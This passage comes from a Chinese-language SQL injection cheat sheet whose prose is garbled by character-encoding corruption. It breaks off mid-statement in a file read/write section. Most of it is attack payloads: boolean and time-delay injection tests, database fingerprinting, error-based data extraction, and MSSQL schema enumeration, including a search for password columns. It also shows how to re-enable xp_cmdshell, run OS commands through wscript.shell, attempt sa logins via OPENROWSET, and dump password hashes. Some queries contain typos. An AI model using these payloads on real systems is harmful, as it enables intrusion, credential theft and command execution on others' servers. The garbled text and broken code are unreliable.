¹æ®æ•°æ®åº“å¹³å°çš„ä¸åŒé‡‡ç”¨ä¸åŒçš„è¿æ¥è¯­æ³•ã€‚ç”±äºæˆ‘ä»¬å¯èƒ½äº‹å…ˆçŸ¥é“æ˜¯å“ªä¸€ç§æ•°æ®åº“æœåŠ¡å™¨ï¼Œ å› æ­¤å…¸å‹çš„åŠæ³•æ˜¯ä¸€å¼€å§‹å°±ä½¿ç”¨ç›®æ ‡å¹³å°çš„å­—ç¬¦ä¸²è¿æ¥è¯­æ³•ï¼Œæ¯”å¦‚  Microsoft SQL Serverã€Oracle æˆ– MySQLã€‚ä¸‹åˆ— URL å®ç°äº†å†é€ å‚æ•°å€¼â€shoesâ€çš„å­—ç¬¦ä¸²è¿æ¥ï¼š <br>Microsoft  SQL Server  <a href="http://target/products.asp?catagory=sho%27+%27es(+%E6%98%AF+%E5%8F%B7%E7%9A%84URL%E7%BC%96%E7%A0%81)">http://target/products.asp?catagory=sho'%2b'es(%2bæ˜¯+å·çš„URLç¼–ç )</a><br>Oracle æˆ– PostgreSQL  <a href="http://target/products.asp?catagory=sho%27%7C%7C%27es">http://target/products.asp?catagory=sho'||'es</a> <br>MySQL  <a href="http://target/products.asp?catagory=sho%27%20%27es">http://target/products.asp?catagory=sho'%20'es</a>  (%20æ˜¯ç©ºæ ¼å­—ç¬¦çš„URLç¼–ç )æ”¹å˜è¿æ¥æ“ä½œç¬¦ä¸¤ä¾§çš„å­ä¸²å°†ä½¿è¾“å…¥æ— æ•ˆï¼Œå¹¶å–å›ä¸å…¶ä»–ä»»æ„éšæœºå­—ç¬¦ä¸²ä¸€è‡´çš„ç»“æœã€‚</td></tr><tr><td>åœ¨æœåŠ¡å™¨çš„å“åº”ä¸­ï¼ŒSQLæ¡ä»¶è¡¨è¾¾å¼çš„é™„åŠ éƒ¨åˆ†æ˜¯å¦äº§ç”Ÿä¸€è‡´ çš„å·®å¼‚æ€§ï¼Ÿ</td><td>ä»ç»Ÿè®¡è§’åº¦è®²ï¼Œå¤§å¤šæ•°SQLæ³¨å…¥æ¼æ´éƒ½å‘ç”Ÿåœ¨è¿™æ ·çš„æƒ…å†µä¸‹ï¼šå½“ç”¨æˆ·æä¾›çš„æ•°æ®è¢«ä¸å®‰å…¨åœ°åŒ…å«åœ¨æ“ä½œæ•°ä¸­ï¼Œå¹¶è¢«ä¼ é€’ç»™WHEREå­å¥æ—¶ã€‚ åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œè¯·æ³¨æ„URLå’Œäº§ç”Ÿçš„SQLæŸ»è¯¢ï¼š  <br>URL: <a href="http://targetserver/news.php?id=100">http://targetserver/news.php?id=100</a>  <br>SQL: SELECT * FROM news WHERE article_id=100 <br>åœ¨æ­£å¸¸çš„æ“ä½œä¸‹ï¼Œä¸Šé¢è¿™ä¸ªä¾‹å­å°†å–å›å¹¶æ˜¾ç¤ºarticle_idå€¼ç­‰äº100çš„æ–°é—»æ–‡ç« ã€‚ä½†æ˜¯ï¼Œå¦‚æœå‚æ•°idå®¹æ˜“å—åˆ°SQLæ³¨å…¥&amp;å‡»ï¼Œé‚£ä¹ˆä¸‹é¢çš„è¯·æ±‚å°†äº§ç”Ÿä¸åŒçš„ç»“æœï¼š<br>URL 1: <a href="http://targetserver/news.php?id=100">http://targetserver/news.php?id=100</a> and 1=1  URL 2: <a href="http://targetserver/news.php?id=100">http://targetserver/news.php?id=100</a> and 1=2  <br>é€šè¿‡æ·»åŠ â€and 1=1â€ï¼Œåœ¨é¡µé¢ä¸Šåº”è¯¥çœ‹ä¸åˆ°æ”¹å˜ï¼Œå› ä¸ºä»é€»è¾‘ä¸Šæ¥è®²ï¼Œè¯¥è¡¨è¾¾å¼å¹¶æœªæ”¹å˜WHEREå­å¥çš„è¾“å‡ºï¼š <br> SELECT * FROM news WHERE article_id=100 and 1=1 ç›¸åï¼Œæ·»åŠ â€and 1=2â€æ„å‘³ç€WHEREå­å¥å¹¶ä¸åŒ¹é…æ•°æ®åº“ä¸­çš„ä»»ä½•è®°å½•ï¼š<br>SELECT * FROM news WHERE article_id=100 and 1=2 é€šè¿‡ä½¿ç”¨è¿™ç§æŠ€æœ¯æ“çºµæœåŠ¡å™¨çš„å“åº”ï¼Œæˆ‘ä»¬å¸¸å¸¸å¯ä»¥è¯†åˆ«SQLæ³¨å…¥æ¼æ´çš„å­˜åœ¨ã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¯èƒ½éœ€è¦é€šè¿‡å…³é—­åœ†æ‹¬å·æˆ–è€…æ‰“ç ´å¼•å·ç•Œå®šçš„æ•°æ®ï¼Œä»¥ä¾¿ä½¿ç”¨è¿™ç§æŠ€æœ¯ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢ä¸€ç³»åˆ—çš„è¡¨è¾¾å¼ï¼š  <br>â€˜AND  â€˜aâ€™=â€™a Vs    â€˜AND â€˜aâ€™=â€™bâ€™  AND  1=1-Vs     â€˜AND 1=2â€“  ) AND 1=1â€“ Vs    ) AND 1=1â€“  â€˜) AND 1=1-Vs     â€˜) AND 1=2â€“</td></tr><tr><td>æ˜¯å¦æœ‰å¯èƒ½è§¦å‘å¯åº¦é‡çš„æ—¶é—´ å»¶è¿Ÿï¼Ÿ</td><td>é€šè¿‡SQLæ³¨å…¥è§¦å‘å¯åº¦é‡çš„æ—¶é—´å»¶è¿Ÿï¼Œæ—¢å¯ä»¥ç”¨æ¥ç¡®è®¤æ˜¯å¦å­˜åœ¨ç¼ºé™·ï¼Œ åœ¨ç»å¤§å¤šæ•°æƒ…å†µä¸‹ä¹Ÿå¯ä»¥ç”¨æ¥è¯†åˆ«åå°æ•°æ®åº“ã€‚</td></tr></tbody></table><h4 id="è¯†åˆ«æ•°æ®åº“å¹³å°"><a href="#è¯†åˆ«æ•°æ®åº“å¹³å°" class="headerlink" title="è¯†åˆ«æ•°æ®åº“å¹³å°"></a>è¯†åˆ«æ•°æ®åº“å¹³å°</h4><ol><li>é€šè¿‡æ—¶é—´å»¶è¿Ÿæ¨ç†è¯†åˆ«æ•°æ®åº“å¹³å°</li></ol><p>äº§ç”Ÿæ—¶é—´å»¶è¿Ÿ</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>å¹³å°</td><td>æ—¶é—´å»¶è¿Ÿ</td></tr><tr><td>Microsoft SQL Server</td><td><code>WAITFOR DELAY 0:0:10'  </code></td></tr><tr><td>Oracle</td><td><code>BEGIN DBMS LOCK.SLEEP(5);END;-- (ä»…PL/SQLæ³¨å…¥)</code><br><code>SELECT UTL_INADDR.get_host_name('192.168.0.1') FROM dual </code><br><code>SELECT UTL_INADDR.get_host_address('foo.nowhere999.zom'ï¼‰FROM dual </code><br>SELECT UTL_HTTP.REOUEST(â€˜<a href="http://www.oracle.com/">http://www.oracle.com</a>â€˜) FROM dual</td></tr><tr><td>MySQL</td><td><code>BENCHMARK(1000000,MD5("HACK")) -- ä½äº5.0.12ç‰ˆæœ¬</code>  <code>SLEEP(10)-- 5.0.12 åŠæ›´é«˜ç‰ˆæœ¬</code></td></tr><tr><td>PostgreSQL</td><td><code>SELECT pg_sleep(10);-- 8.2 åŠæ›´é«˜ç‰ˆæœ¬</code> <br> <code>CREATE OR REPLACE FUNCTION  pg_sleep(int) RETURNS int AS '/lib/libc.so.6','sleep' language 'C'  STRICT;-- åœ¨Linuxä¸Šåˆ›å»º pg_sleep å‡½æ•°ï¼Œè¦æ±‚ postgres/pgsql çº§åˆ«çš„æƒé™</code></td></tr></tbody></table><ol start="2"><li>é€šè¿‡SQLæ–¹è¨€æ¨ç†è¯†åˆ«æ•°æ®åº“å¹³å°</li></ol><p>SQLæ–¹è¨€å·®å¼‚</p><table><thead><tr><th>å¹³   å°</th><th>è¿æ¥ç¬¦</th><th>è¡Œæ³¨é‡Š</th><th>å”¯ä¸€çš„é»˜è®¤è¡¨ã€å˜é‡æˆ–å‡½æ•°</th><th>Intè½¬charå‡½æ•°</th></tr></thead><tbody><tr><td>Microsoft SQL Server</td><td>â€˜Aâ€™+â€™Bâ€™</td><td>â€“</td><td><code>@@PACK_RECEIVED</code></td><td><code>char(0*41)</code></td></tr><tr><td>Oracle</td><td>â€˜Aâ€™||â€™Bâ€™ concat(â€˜Aâ€™,â€™Bâ€™)</td><td>â€“</td><td><code>BITAND(1,1)</code></td><td><code>chr(65)</code></td></tr><tr><td>MySQL</td><td>concat(â€˜Aâ€™,â€™Bâ€™)  â€˜Aâ€™ â€˜Bâ€™</td><td>#</td><td><code>CONNECTION_ID()</code></td><td><code>char(0x41)</code></td></tr><tr><td>Access</td><td>â€œAâ€ &amp; â€œBâ€</td><td>N/A</td><td><code>msysobjects</code></td><td><code>chr(65)</code></td></tr><tr><td>PostgreSQL</td><td>â€˜Aâ€™||â€™Bâ€™</td><td>â€“</td><td><code>getpgusemame()  </code></td><td><code> chr(65)</code></td></tr><tr><td>DB2</td><td>â€˜aâ€™ concat â€˜bâ€™</td><td>â€“</td><td><code>sysibm.systables</code></td><td><code>chr(65)</code></td></tr></tbody></table><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#Microsoft SQL Server</span><span class="token string">'AND @@PACK_RECEIVED = @@PACK_RECEIVED -- '</span><span class="token comment">#MySQL</span><span class="token string">'AND CONNECTION_ID() = CONNECTION_ID()-- '</span><span class="token comment">#Oracle</span><span class="token string">'AND BITAND(1,1) = BITAND(1,1)-- '</span><span class="token comment">#PostgreSQL</span>'<span class="token operator">AND</span> getpgusername<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> getpgusername<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é€šè¿‡é”™è¯¯æ¶ˆæ¯æå–æ•°æ®</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#Microsoft SQL Server</span><span class="token operator">AND</span> <span class="token number">1</span> <span class="token operator">in</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span><span class="token punctuation">(</span>Aversion<span class="token punctuation">)</span> <span class="token comment">-- </span><span class="token operator">AND</span> <span class="token number">1</span><span class="token operator">=</span><span class="token keyword">CONVERT</span><span class="token punctuation">(</span><span class="token keyword">INT</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> @<span class="token variable">@VERSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">-- </span><span class="token comment">#MySQL</span><span class="token operator">AND</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> VERSION<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">)</span>a<span class="token punctuation">)</span><span class="token comment">#</span><span class="token comment">#Oracle</span><span class="token operator">AND</span> <span class="token number">1</span><span class="token operator">=</span><span class="token punctuation">(</span>utl_inaddr<span class="token punctuation">.</span>get_host_name<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> banner <span class="token keyword">FROM</span> v$version <span class="token keyword">WHERE</span> rownum<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">-- </span><span class="token operator">AND</span> <span class="token number">1</span><span class="token operator">=</span>CTXSYS<span class="token punctuation">.</span>DRITHSX<span class="token punctuation">.</span>SN<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> banner <span class="token keyword">FROM</span> v$version <span class="token keyword">WHERE</span> rownum<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">-- </span><span class="token comment">#PostgreSQL</span><span class="token operator">AND</span> <span class="token number">1</span><span class="token operator">=</span>CAST<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>::<span class="token keyword">text</span> <span class="token keyword">AS</span> <span class="token keyword">NUMERIC</span><span class="token punctuation">)</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>å°†å¤šè¡Œåˆå¹¶ä¸ºå•è¡Œ</li></ol><p>ä½¿ç”¨SQLåˆå¹¶å¤šè¡Œ  </p><table><thead><tr><th>å¹³   å°</th><th>åˆå¹¶å¤šè¡Œå’Œï¼ˆæˆ–ï¼‰åˆ—çš„æŸ¥è¯¢</th></tr></thead><tbody><tr><td>Microsoft SQL  Server</td><td><code>BEGIN DECLARE @x varchar (8000) SET @x=' '  SELECT @x=@x+'/'+name FROM sysobjects WHERE name&gt;'a' ORDER BY name END; SELECT @x AS DATA INTO foo</code> <br><code>-- populates the @x variable with all "name"column values from sysobjects table. Data from the @x variable is the stored in a table named foo under a column named data</code> <code>BEGIN DECLARE @x varchar(8000) SET @x=' '  SELECT @x=@x+'/'+name FROM sysobjects WHERE name&gt;'a' ORDER BY name; SELECT 1 WHERE 1 IN (SELECT @x) END;</code><br><code>-- As above but displays results with the sQL server error message</code><br> <code>SELECT name FROM sysobjects FOR XML RAW</code><br><code>-- returns the resultset as a single XML formatted string</code></td></tr><tr><td>Oracle</td><td>`SELECT sys.stragg(distinct username</td></tr><tr><td>MySQL</td><td><code>SELECT GROUP_CONCAT(user) FROM mysql.user;</code> <br><code>--Returns a comma separated list of  users.  </code></td></tr><tr><td>PostgreSQL</td><td><code>SELECT array_to_string(array(SELECT  datname FROM pg_database), ':');</code> <code>-- Returns a colon seperated list of database names </code></td></tr></tbody></table><h4 id="Microsoft-SQL-Server-å¤‡å¿˜å•"><a href="#Microsoft-SQL-Server-å¤‡å¿˜å•" class="headerlink" title="Microsoft SQL Server å¤‡å¿˜å•"></a>Microsoft SQL Server å¤‡å¿˜å•</h4><ol><li>æšä¸¾æ•°æ®åº“é…ç½®ä¿¡æ¯å’Œæ¨¡å¼</li></ol><p>æå–Microsoft SQL Serverçš„é…ç½®ä¿¡æ¯</p><table><thead><tr><th>æ•°   æ®</th><th>æŸ¥  è¯¢</th></tr></thead><tbody><tr><td>ç‰ˆæœ¬</td><td><code>SELECT @@version;</code></td></tr><tr><td>å½“å‰ç”¨æˆ·</td><td><code>SELECT system user;</code><br><code>SELECT suser_sname();</code><br><code> SELECT user;</code><br><code> SELECT loginame FROM master..sysprocesses WHERE spid =@@SPID;</code></td></tr><tr><td>åˆ—å‡ºç”¨æˆ·</td><td><code>SELECT name FROM master..syslogins;  </code></td></tr><tr><td>å½“å‰ç”¨æˆ·æƒé™ï¼Œå¦‚æœç”¨æˆ·ä¸ºsysadminï¼Œè¿”å›1;å¦‚æœç”¨æˆ·ä¸å…·æœ‰sysadminæƒé™ï¼Œè¿”å›0</td><td><code>SELECT is_srvolemenber('sysadmin');  </code></td></tr><tr><td>æ•°æ®åº“æœåŠ¡å™¨ä¸»æœºå</td><td><code>SELECT  @@ servername;</code><br><code>SELECT  SERVEROROPERTY('productversion'), SERVERPROPERTY('productlevel'),SERVERPROPERTY('edition');  -- ä»… SQL  Server 2005</code></td></tr></tbody></table><p>æå–Microsoft SQL Serverçš„æ¨¡å¼ä¿¡æ¯</p><table><thead><tr><th>æ•°   æ®</th><th>æŸ¥   è¯¢</th></tr></thead><tbody><tr><td>å½“å‰æ•°æ®åº“</td><td><code>SELECT DB_NAME();</code></td></tr><tr><td>åˆ—å‡ºæ•°æ®åº“</td><td><code>SELECT name FROM master..sysdatabases;</code><br>  <code>SELECT DB NAME(N);</code><br><code>-- Where N is the database number </code></td></tr><tr><td>åˆ—å‡ºè¡¨</td><td>å½“å‰æ•°æ®åº“ä¸­çš„è¡¨ï¼š<br><code>SELECT name FROM sysobjects WHERE xtype='u';</code><br><code>SELECT name FROM sysobjects WHERE xtype='V';--è§†å›¾</code><br>masteræ•°æ®åº“ä¸­çš„è¡¨ï¼š<br><code>SELECT name FROM master..sysobjects WHERE xtype='U';</code><br><code>SELECT name FROM master..sysobjects WHERE xtype='V';</code></td></tr><tr><td>åˆ—å‡ºåˆ—</td><td>å½“å‰æ•°æ®åº“ä¸­tblUsersè¡¨çš„åˆ—åï¼š<br><code>SELECT name FROM syscolumns WHERE id=object_id('tblUsers');</code><br>adminæ•°æ®åº“ä¸­tblUsersè¡¨çš„åˆ—åï¼š<br><code>SELECT name FROM admin..syscolumns WHERE id=object_id('admin..tblmembers');</code></td></tr><tr><td>æŸ»æ‰¾å…·æœ‰æŒ‡å®šåç§°çš„åˆ—</td><td>æŸ¥æ‰¾æŒ‡å®šçš„name <br><code>drop table pentestï¼›begin declare@ret varchar(8000) set @ret=CHAR(58) select @ret=@ret+CHAR(32)+o.name+ CHAR(47)+c.name from syscolumns c,sysobjects o where c.name LIKE '%XXX%' and c.id=o.id and o.type='U' select @ret as ret into pentest end-</code><br>URLç¼–ç <br>æŸ¥æ‰¾åç§°ä¸­åŒ…å«Passçš„åˆ—å<br><code>drop table pentest;begin declare @ret varchar(8000) set @ret=CHAR(58) select @ret=@ret+CHAR(32)+o.name+CHAR(47)+c.name from syscolumns c,sysobjects o where (c.name LIKE'%[Pp][Aa][Ss][Ss]%' or c.name LIKE'%[Pp][Ww][Dd]%') and c.id=o.id and o.type='U' select @ret as ret into pentest end-</code><br>URLç¼–ç </td></tr><tr><td>åœ¨åˆ—ä¸­æŸ¥æ‰¾ç‰¹å®šçš„å€¼</td><td>å¯¹äºæŒ‡å®šçš„æœç´¢å­—ç¬¦ä¸²ï¼Œè¿”å›æ•°æ®åº“å’Œåˆ—çš„åç§°ï¼Œå¹¶å°†æ•°æ®å­˜å‚¨åœ¨fooæ•°æ®åº“ä¸­<code>Drop table #Results;Drop table foo;CREATE TABLE #Results(ColumnName nvarchar(370),ColumnValue nvarchar(3630);SET NOCOUNT ON;DECLARE @TableName nvarchar(256),@columnNamenvarchar(128), @Searchstr2 nvarchar(110) SET @TableName = ''; SET @searchstr2 = QUOTENAME('%'+'dave'+'%',''''); WHILE @TableName IS NOT NULL BEGIN SET @columnName = ''; SET @TableName =(SELECT MIN (QUOTENAME(TABLE_SCHEMA) + '.' + QUOTENAME(TABLE_NAME)) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE_TABLE' AND OUOTENAME (TABLE_SCHEMA) + '.' + QUOTENAME(TABLE_NAME) &gt; @rableName AND OBJECTPROPERTY (OBJECT_ID(QUOTENAME(TABLE_SCHEMA)+ QUOTENAME(TABLE_NAME)),'IsMSShipped') = 0); WHILE (@TableName IS NOT NULL) AND (@ColumnName IS NOT NULL) BEGIN SET @ColumnName =(SELECT MIN (QUOTENAME(COLUMN_NAME)) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA PARSENAME (@TableName, 2) AND TABLE_NAME = PARSENAME(@TableName, 1) AND DATA_TYPE IN ('char', 'varchar', 'nchar','nvarchar') AND QUOTENAME (COLUMN_NAME) &gt; @columnName); IF @ColumnName IS NOT NULL BEGIN INSERT INTO #Results EXEC('SELECT '''+@rableName +'.'+@columnName+''',LEFT('+@columnName +', 3630) FROM'+ @rableName+'(NOLOCK)+'WHERE' + @columnName + 'LIKE'+@Searchstr2); END END END select ColumnName, ColumnValue into foo FROM # Results</code><br>URLç¼–ç </td></tr></tbody></table><ol start="2"><li>SQL ç›²æ³¨å‡½æ•°ï¼šMicrosoft SQL Server</li></ol><p>SQLç›²æ³¨å‡½æ•°</p><table><thead><tr><th>æ•°   æ®</th><th>æŸ¥  è¯¢</th></tr></thead><tbody><tr><td>å­—ç¬¦ä¸²é•¿åº¦</td><td><code>LEN()  </code></td></tr><tr><td>ä»ç»™å®šå­—ç¬¦ä¸²ä¸­æå–å­ä¸²</td><td><code>SUBSTRING(string,offset,length) </code></td></tr><tr><td>å­—ç¬¦ä¸²ï¼ˆâ€™ABCâ€™ï¼‰ä¸å¸¦å•å¼•å·çš„è¡¨ç¤ºæ–¹å¼</td><td><code>SELECT char(0x41) + char(0x42) + char(0x43);  </code></td></tr><tr><td>è§¦å‘æ—¶é—´å»¶è¿Ÿ</td><td><code>WAITFOR DELAY '0:0:9'; --cè§¦å‘9ç§’çš„æ—¶é—´å»¶è¿Ÿ </code></td></tr><tr><td>IFè¯­å¥</td><td><code>IF (1=1) SELECT 'A' ELSE SELECT 'B' -- è¿”å›  </code></td></tr></tbody></table><ol start="3"><li>Microsoft SQL Server çš„æƒé™æå‡</li></ol><p>Microsoft SQL Server çš„ç‰ˆæœ¬å·</p><table><thead><tr><th>ç‰ˆæœ¬å·</th><th>æœåŠ¡åŒ…</th></tr></thead><tbody><tr><td>9.00.3042</td><td>Microsoft SQL Server 2005 SP2</td></tr><tr><td>9.00.2047</td><td>Microsoft SQL Server 2005 SP1</td></tr><tr><td>9.00.1399</td><td>Microsoft SQL Server 2005</td></tr><tr><td>8.00.2039</td><td>Microsoft SQL Server 2000 SP4</td></tr><tr><td>8.00.818</td><td>Microsoft SQL Server 2000 SP3  w/Cumulative Patch MS03-031</td></tr><tr><td>8.00.760</td><td>Microsoft SQL Server 2000 SP3</td></tr><tr><td>8.00.532</td><td>Microsoft SQL Server 2000 SP2</td></tr><tr><td>8.00.384</td><td>Microsoft SQL Server 2000 SP1</td></tr><tr><td>8.00.194</td><td>Microsoft SQL Server 2000</td></tr><tr><td>7.00.1063</td><td>Microsoft SQL Server 7.0 SP4</td></tr><tr><td>7.00.961</td><td>Microsoft SQL Server 7.0 SP3</td></tr><tr><td>7.00.842</td><td>Microsoft SQL Server 7.0 SP2</td></tr><tr><td>7.00.699</td><td>Microsoft SQL Server 7.0 SP1</td></tr><tr><td>7.00.623</td><td>Microsoft SQL Server 7.0</td></tr><tr><td>6.50.479</td><td>Microsoft SQL Server 6.5 SP5a Update</td></tr><tr><td>6.50.416</td><td>Microsoft SQL Server 6.5 SP5a</td></tr><tr><td>6.50.415</td><td>Microsoft SQL Server 6.5 SP5</td></tr><tr><td>6.50.281</td><td>Microsoft SQL Server 6.5 SP4</td></tr><tr><td>6.50.258</td><td>Microsoft SQL Server 6.5 SP3</td></tr><tr><td>6.50.240</td><td>Microsoft SQL Server 6.5 SP2</td></tr><tr><td>6.50.213</td><td>Microsoft SQL Server 6.5 SP1</td></tr><tr><td>6.50.201</td><td>Microsoft SQL Server 6.5 RTM</td></tr></tbody></table><ol start="4"><li>OPENROWSETé‡éªŒè¯æ”»å‡»</li></ol><p>ä¸‹åˆ—OPENROWSETæŸ¥è¯¢å°†å°è¯•ä½¿ç”¨å£ä»¤ä¸ºletmeinçš„saè´¦æˆ·è¿æ¥åˆ°åœ°å€ä¸º 127.0.0.1 çš„ SQL Serverï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">OPENROWSET</span><span class="token punctuation">(</span><span class="token string">'SQLOLEDB'</span><span class="token punctuation">,</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">;</span><span class="token string">'sa'</span><span class="token punctuation">;</span><span class="token string">'letmein'</span><span class="token punctuation">,</span><span class="token string">'SET FMTONLY OFF execute master..xp_cmdshell "dir"'</span><span class="token punctuation">)</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>æ”»å‡»æ•°æ®åº“æœåŠ¡å™¨ï¼šMicrosoft SQL Server</li></ol><ul><li>é€šè¿‡xp_cmdshellæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>xp_cmdshell <span class="token string">'os command'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é‡æ–°å¯ç”¨xp_cmdshell</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token keyword">EXEC</span> sp_configure <span class="token keyword">reconfigure</span> <span class="token keyword">EXEC</span> sp_configure <span class="token string">'xp_cmdshell'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token keyword">EXEC</span> sp configure <span class="token keyword">reconfigure</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>xp_cmdshellå­˜å‚¨è¿‡ç¨‹å·²ç»è¢«åˆ é™¤äº†ï¼Œä½†.dllå¹¶æœªåˆ é™¤ï¼Œå¯ç”¨å®ƒï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_addextendedproc <span class="token string">'xp_cmdshell'</span><span class="token punctuation">,</span> <span class="token string">'xpsq170.dll'</span><span class="token keyword">EXEC</span> sp_addextendedproc <span class="token string">'xp_cmdshell'</span><span class="token punctuation">,</span> 'xplog70<span class="token punctuation">.</span>dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>xp_cmdshellçš„æ›¿ä»£æ–¹æ¡ˆ</li></ul><p>ä½œä¸ºxp_cmdshellå­˜å‚¨è¿‡ç¨‹çš„æ›¿ä»£æ–¹æ¡ˆï¼Œå¯ä»¥æ‰§è¡Œä¸‹åˆ—SQLè¯­å¥æ¥å®ç°ç›¸åŒçš„æ•ˆæœ:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DECLARE</span> <span class="token variable">@altshell</span> <span class="token keyword">INT</span><span class="token keyword">EXEC</span> SP_OACREATE <span class="token string">'wscript.shell'</span><span class="token punctuation">,</span><span class="token variable">@altshell</span> OUTPUT<span class="token keyword">EXEC</span> SP_OAMETHOD <span class="token variable">@altshell</span><span class="token punctuation">,</span><span class="token string">'run'</span><span class="token punctuation">,</span><span class="token string">'null'</span><span class="token punctuation">,</span><span class="token string">'%systemroot%\system32\cmd.exe /c'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¦æƒ³åœ¨Microsoft SQL Server 2005ä¸Šæ‰§è¡Œè¿™ä¸ªæ›¿ä»£çš„shell,é¦–å…ˆè¦æ‰§è¡Œä¸‹åˆ—SQLï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token keyword">EXEC</span> sp_configure <span class="token keyword">reconfigure</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'Ole Automation Procedures'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token keyword">EXEC</span> sp_configure <span class="token keyword">reconfigure</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>ç ´è§£æ•°æ®åº“å£ä»¤</li></ul><p>Microsoft SQL Server 2000çš„å£ä»¤å“ˆå¸Œå­˜å‚¨åœ¨sysxloginsè¡¨ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹åˆ—SQLè¯­å¥æå–å®ƒä»¬</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token keyword">user</span><span class="token punctuation">,</span>password <span class="token keyword">FROM</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>sysxlogins<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>Microsoft SQL Server 2005 å“ˆå¸Œ</li></ul><p>ä»¥ä¸‹SQLè¯­å¥ä¼šæ£€ç´¢saè´¦æˆ·çš„å£ä»¤å“ˆå¸Œï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> password_hash <span class="token keyword">FROM</span> sys<span class="token punctuation">.</span>sql_logins <span class="token keyword">WHERE</span> name<span class="token operator">=</span><span class="token string">'sa'</span><span class="token keyword">SELECT</span> name <span class="token operator">+</span> <span class="token string">'-'</span> <span class="token operator">+</span> master<span class="token punctuation">.</span>sys<span class="token punctuation">.</span>fn_varbintohexstr<span class="token punctuation">(</span>password_hash<span class="token punctuation">)</span> <span class="token keyword">from</span> master<span class="token punctuation">.</span>sys<span class="token punctuation">.</span>sql_logins<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>æ–‡ä»¶è¯»/å†™</li></ul><p>å¦‚æœæ‹¥æœ‰INSERTå’ŒADMINISTER BULK OPERATIONSè®¸å¯ï¼Œå°±å¯ä»¥è¯»å–æœ¬åœ°æ–‡ä»¶ã€‚ä¸‹åˆ—SQLè¯­å¥ä¼šå°†æœ¬åœ°æ–‡ä»¶c:\boot.iniè¯»å–åˆ°localfileè¡¨ä¸­ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> 